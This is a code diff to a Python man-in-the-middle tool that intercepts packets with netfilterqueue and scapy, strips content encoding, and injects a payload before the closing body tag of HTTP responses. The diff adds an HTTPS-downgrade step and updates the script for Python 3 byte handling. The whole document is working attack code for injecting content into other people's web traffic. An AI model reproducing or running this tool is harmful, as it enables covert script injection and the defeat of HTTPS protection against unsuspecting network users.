@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 """
 Author: Matthew Zito (goldmund) 
@@ -15,7 +15,7 @@ import subprocess
 import netfilterqueue
 import scapy.all as scapy
 from scapy.layers.inet import IP, TCP
-from utils.instantiate_queue import instantiate_queue
+from utils.downgrade_https import downgrade_https
 
 ENCODING_REGEX = "Accept-Encoding:.*?\\r\\n"
 LEN_REGEX = "(?:Content-Length:\s)(\d*)"
@@ -24,7 +24,7 @@ INJECTION_REGEX = "</body>"
 class Injector:
     def __init__(self, payload):
         self.payload = payload
-        instantiate_queue()
+        downgrade_https()
         self.bind_queue()
 
     def generate_load(self, packet, load):
@@ -49,7 +49,7 @@ class Injector:
         """
         # wrap payload packet in Scapy IP layer
         scapy_packet_obj = IP(packet.get_payload())
-        if (scapy_packet_obj.haslayer(scapy.Raw)):
+        if (scapy_packet_obj.haslayer(scapy.Raw) and scapy_packet_obj.haslayer(TCP)):
             load = scapy_packet_obj[scapy.Raw].load.decode()
             # request obj
             if (scapy_packet_obj[TCP].dport == 10000):
@@ -72,7 +72,7 @@ class Injector:
             # did we tamper with it?
             if (load != scapy_packet_obj[scapy.Raw].load):
                 generated_packet = self.generate_load(scapy_packet_obj, load)
-                packet.set_payload(str(generated_packet))
+                packet.set_payload(bytes(generated_packet))
 
         packet.accept()
 
